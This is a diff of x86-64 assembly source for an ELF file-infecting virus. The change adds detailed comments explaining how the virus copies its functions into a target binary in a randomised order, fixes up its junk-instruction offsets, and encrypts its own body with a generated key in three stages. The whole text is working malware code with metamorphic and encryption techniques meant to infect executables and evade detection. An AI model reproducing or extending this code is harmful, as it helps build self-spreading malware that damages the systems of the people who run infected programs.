@@ -261,8 +261,8 @@ _init_mmap_tmp:
 ;	Then we calcul the checksum of the text section (virus included), and store the start of checksum calculation, the size
 ;		of calculation, and the result. Then we can check about modified code when virus is launched.
 ;	Then we complite with a padding of 0x00 bytes to write a multiple of page size.
-;	After we write the end of the binary.
-;
+;	After that, we write the end of the binary.
+;;;;;;;;
 
 ;;;;;;;;;;;;;;;;;
 ; mmap tmp
@@ -317,118 +317,163 @@ _copy_start_point:
 ;; The first one contains offset to the "zone" of our 
 _copy_unencrypted_part:
 	.init:
+
+; Initialize random number min/max values 
 	mov QWORD [rsp + 156], 0 ; min
 	mov QWORD [rsp + 164], 3 ; max
+
+; Take the base offset of the first function we will write.
+; Note that the first offset in _functions_offset_from_start table is always the same.
 	lea r11, [rel _start]
 	lea r12, [rel _checkproc]
 	sub r12, 8
 	sub r12, r11
 	mov QWORD [rsp + 172], r12 ; first offset from start
-	lea r10, [rel _checkproc]
-	sub r10, 8
-	lea r11, [rel _functions_offset_from_start]
-	sub r11, r10
-	add r11, QWORD [rsp + 116]
-	add r11, QWORD [rsp + 108]
-	mov QWORD [rsp + 180], r11 ; offset to table_offset on mmap
+
+; Take the total addr on mmap of the table_offset in the binary we are infecting.
+	lea r10, [rel _checkproc] ; take addr of _checkproc
+	sub r10, 8 ; sub 8, to take the opcode before the function
+	lea r11, [rel _functions_offset_from_start] ; take our _functions table
+	sub r11, r10 ; take the distance
+	add r11, QWORD [rsp + 116] ; add the number of byte we already writed (start of binary - start of _check_proc)
+	add r11, QWORD [rsp + 108] ; add the addr of mmap
+	mov QWORD [rsp + 180], r11 ; total addr to _functions_offset_from_start on mmap
+
+; Initialize to 0 some variables
+	; this is a "mask" all byte correspond to an index in our table. If a byte is at 1, so we already right
+	; in our file the function at this index on our table_offset
 	mov QWORD [rsp + 188], 0
-	mov QWORD [rsp + 196], 0
+	; just a temporary variable
 	mov QWORD [rsp + 204], 0
-	lea r12, [rel _table_offset]
-	mov QWORD [rsp + 212], r12
+
+; Mov the base table_offset in the stack. So offset we will not touch will be their too
 	lea rdi, [rsp + 240]
 	lea rsi, [rel _table_offset]
 	mov rcx, 16
 	cld
 	rep movsq
+
+; Now we can loop
 	.loop:
+		; First we generate our number, according to the min/max values
 		mov rdi, QWORD [rsp + 156]
 		mov rsi, QWORD [rsp + 164]
-		mov rdx, 0x9485731273645823
+		mov rdx, 0x9485731273645823 ; <-- This seed is totally arbitrary
 		xor rax, rax
 		call _urand
+
+		; Now we will check for the first function at this index that is not already writed.
+		; To do so, we will incremente rcx, check if at rcx index the function is at 0, if it is,
+		; we decremente rax, and when rax is at 0, we are at our index.
 		xor rcx, rcx
 		.look_for_unwrited_function:
-			cmp BYTE [rsp + 188 + rcx], 0
+			cmp BYTE [rsp + 188 + rcx], 0 ; check if mask is at 1 in that index
 			je .verif_rax
-				inc rcx
+				inc rcx ; just increment to next byte on mask
 				jmp .look_for_unwrited_function
 			.verif_rax:
-				cmp rax, 0
+				cmp rax, 0 ; check if rax = 0.
 				je .write_function
 				inc rcx
 				dec rax
 				jmp .look_for_unwrited_function
 		.write_function:
+		; We find our function index, So we update our mask
 		mov BYTE [rsp + 188 + rcx], 1
+
+		; Our table contains 8 bytes long values, so multiply the index by 8
 		mov rax, rcx
 		mov rcx, 8
 		mul rcx
+
+		; Take the total addr in current file, of the function _start + offset
 		mov rdi, QWORD [rsp + 108]
 		add rdi, QWORD [rsp + 116]
 		lea rsi, [rel _functions_offset_from_start]
-		add rsi, rax
+		add rsi, rax ; go to our index in table
+		; take the next index in table
 		mov rcx, rsi
 		add rcx, 8
 		lea r10, [rel _start]
-		mov rsi, QWORD [rsi]
-		mov QWORD [rsp + 220], rsi
-		sub QWORD [rsp + 220], 8
-		add rsi, r10
-		sub rsi, 8
-		mov rcx, QWORD [rcx]
-		add rcx, r10
-		sub rcx, 8
+		mov rsi, QWORD [rsi] ; take the offset of our index in table
+		mov QWORD [rsp + 220], rsi ; save it, we will need it
+		sub QWORD [rsp + 220], 8 ; dont forget the 8 bytes of opcode before the function
+		add rsi, r10 ; add the actual _start addr to our offset
+		sub rsi, 8 ; 8 bytes for opcode
+		mov rcx, QWORD [rcx] ; take the offset of our index + 1
+		add rcx, r10 ; add _start addr to our offset
+		sub rcx, 8 ; 8 bytes for opcode
+		; rax is our index*8, if we are at index 3, we will be at offset 3*8=24, and this is the
+		; last offset of the table, after this, it's juste code. So if we are at the end of the table,
+		; rcx will not be index+1, but will be the addr of _functions_offset_from_start table,
+		; that is directly after the last function swapped in file. Note that we don't need to substract
+		; 8 to this rcx, because it's not a function with opcode.
 		cmp rax, 24
 		jl .not_at_end_table
 		lea rcx, [rel _functions_offset_from_start]
 		.not_at_end_table:
-		sub rcx, rsi
-		mov QWORD [rsp + 204], rcx
-		add QWORD [rsp + 116], rcx
+		sub rcx, rsi ; take the size of the zone to write
+		mov QWORD [rsp + 204], rcx ; save it on stack
+		add QWORD [rsp + 116], rcx ; add it to the number of byte we already writed on file
 		cld
-		rep movsb
+		rep movsb ; write our function
+		
+		; Now we will check all our junk offsets that are between our actual function offset (not the offset of
+		; where we writted it, but the offset of the actual file), and this offset + the zone size.
+		; All theis junks instructions will be incremented according to the offset incrementation of the zone,
+		; in the new file.
+		; To do so, we will check all the junks offset in the current file offset table, and update the offset
+		; of the junks in our zone according to the same incrementation offset of the zone.
 		.check_loop_table_offset:
+			; Initialisation
 			xor rcx, rcx
-			xor rsi, rsi
-			lea rdi, [rel _table_offset]
+			lea rdi, [rel _table_offset] ; take our current file table_offset
 			.check_offsets_loop:
-				mov r10, QWORD [rsp + 220]
+				mov r10, QWORD [rsp + 220] ; take our zone offset in current file.
+				; If the offset of our index is lower than the offset of the zone, the junk isn't in our zone.
 				cmp DWORD [rdi + rcx], r10d
 				jl .next_offset
-				add r10, QWORD [rsp + 204]
+				add r10, QWORD [rsp + 204] ; take the size of the zone, and add it to our zone offset
+				; If the offset is greater of equal than the offset+size of the zone, the junk isn't in our zone
 				cmp DWORD [rdi + rcx], r10d
 				jge .next_offset
 
-				mov r10d, DWORD [rsp + 172]
-				sub r10d, DWORD [rsp + 220]
+				; If we are here, the junk is in our zone
+				; We first calcul the offset difference between current zone offset, and new file zone offset.
+				mov r10d, DWORD [rsp + 172] ; take the zone offset in the new infected file.
+				sub r10d, DWORD [rsp + 220] ; substract the zone offset of our current file.
+
+				; take the offset of the junk in zone
 				lea r11, [rel _table_offset]
 				add r11, rcx
-				mov r11d, DWORD [r11]
-				mov DWORD [rsp + 240 + rcx], r11d
-				add DWORD [rsp + 240 + rcx], r10d
+				mov r11d, DWORD [r11] ; take the offset value
+				mov DWORD [rsp + 240 + rcx], r11d ; mov it on our tmp table on stack
+				add DWORD [rsp + 240 + rcx], r10d ; add the difference to this junk.
 
 				.next_offset:
-				cmp rcx, 124
+				cmp rcx, 124 ; if index on table_offset is 124, we reach the end of our table.
 				je .table_updated
-				add rcx, 4
+				add rcx, 4 ; offset on _table_offset are 4 bytes long
 				jmp .check_offsets_loop
 		.table_updated:
-		mov rdi, QWORD [rsp + 180]
-		mov rsi, QWORD [rsp + 172]
-		mov QWORD [rdi], rsi
-		add QWORD [rdi], 8
-		mov rsi, QWORD [rsp + 204]
-		add QWORD [rsp + 172], rsi
-		add QWORD [rsp + 180], 8
-		cmp QWORD [rsp + 164], 0
+
+		; Now we will update _functions_offset_from_start table
+		mov rdi, QWORD [rsp + 180] ; take table addr on mmap
+		mov rsi, QWORD [rsp + 172] ; take the offset of the functions in the new file
+		mov QWORD [rdi], rsi ; mov in our table the offset of our function
+		add QWORD [rdi], 8 ; add 8 to the offset, the 8 bytes of the opcode
+		mov rsi, QWORD [rsp + 204] ; take the size of the function
+		add QWORD [rsp + 172], rsi ; add the size to the offset from start for the next function.
+		add QWORD [rsp + 180], 8 ; add 8, the size of opcode
+		cmp QWORD [rsp + 164], 0 ; check we our max random value is at 0
 		jle .inc_with_table_size
-		dec QWORD [rsp + 164]
+		dec QWORD [rsp + 164] ; we decremente our max random value.
 		jmp .loop
 	.inc_with_table_size:
-	add QWORD [rsp + 116], 32
+	add QWORD [rsp + 116], 32 ; we already writed our _functions_offset_from_start table, so just update the number of byte already writted
 
 _copy_jump_to_function:
+	; Copy the jump function
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
 	lea rsi, [rel _jump_to_function]
@@ -443,50 +488,42 @@ _copy_jump_to_function:
 ;	sub rcx, rsi
 ;	add QWORD [rsp + 116], rcx
 
+; We will copy the encrypted zone, but in 3 times:
+; First we will copy from _encrypted_part_start to _table_offset (excluded), and save the key
+; Second we will encrypt _table_offset table with our previous key
+; Third, we will encrypt the rest, from end of _table_offset to _padding (excluded)l with our previous key
 _copy_encrypt_zone:
-;; encrypt_zone(virus, virus_size, mmap_tmp + index)
 ; setting parameters
 ; take the base addr to encrypt
 	lea rdi, [rel _encrypted_part_start]
 ; calculate the size to encrypt
 	lea rsi, [rel _table_offset]
-;	lea rsi, [rel _final_end] ; take the end addr to encrypt
-;	add rsi, 2
 	sub rsi, rdi ; calculate the size to encrypt
 ; take the addr to store the encrypted part
 	mov rdx, QWORD [rsp + 108] ; mmap addr
 	add rdx, QWORD [rsp + 116] ; offset
-	xor r10, r10
+	xor r10, r10 ; key = NULL (the function will check if r10 is at 0, and generate a key if it is 0)
 	call _encrypt_zone
 	mov QWORD [rsp + 132], rax ; take the key addr the function returned
 	lea rsi, [rel _table_offset]
-;	add rsi, 2
 	lea r10, [rel _encrypted_part_start]
 	sub rsi, r10
 	add QWORD [rsp + 116], rsi
 
 ; take the base addr to encrypt
 	lea rdi, [rsp + 240]
-; calculate the size to encrypt
-;	lea rsi, [rel _table_offset]
-;	lea rsi, [rel _final_end] ; take the end addr to encrypt
-;	add rsi, 2
-;	sub rsi, rdi ; calculate the size to encrypt
-	mov rsi, 128
+	mov rsi, 128 ; size of our table
 ; take the addr to store the encrypted part
 	mov rdx, QWORD [rsp + 108] ; mmap addr
 	add rdx, QWORD [rsp + 116] ; offset
-	mov r10, QWORD [rsp + 132]
+	mov r10, QWORD [rsp + 132] ; mov our key addr to r10, so our function will not generate another key
 	call _encrypt_zone
-;	add rsi, 2
 	add QWORD [rsp + 116], 128
 
 	lea rdi, [rel _table_offset]
-	add rdi, 128
+	add rdi, 128 ; encrypt the part after our table, so table_addr + table_size
 ; calculate the size to encrypt
 	lea rsi, [rel _padding]
-;	lea rsi, [rel _final_end] ; take the end addr to encrypt
-;	add rsi, 2
 	sub rsi, rdi ; calculate the size to encrypt
 ; take the addr to store the encrypted part
 	mov rdx, QWORD [rsp + 108] ; mmap addr
@@ -494,7 +531,6 @@ _copy_encrypt_zone:
 	mov r10, QWORD [rsp + 132]
 	call _encrypt_zone
 	lea rsi, [rel _padding]
-;	add rsi, 2
 	lea r10, [rel _table_offset]
 	add r10, 128
 	sub rsi, r10
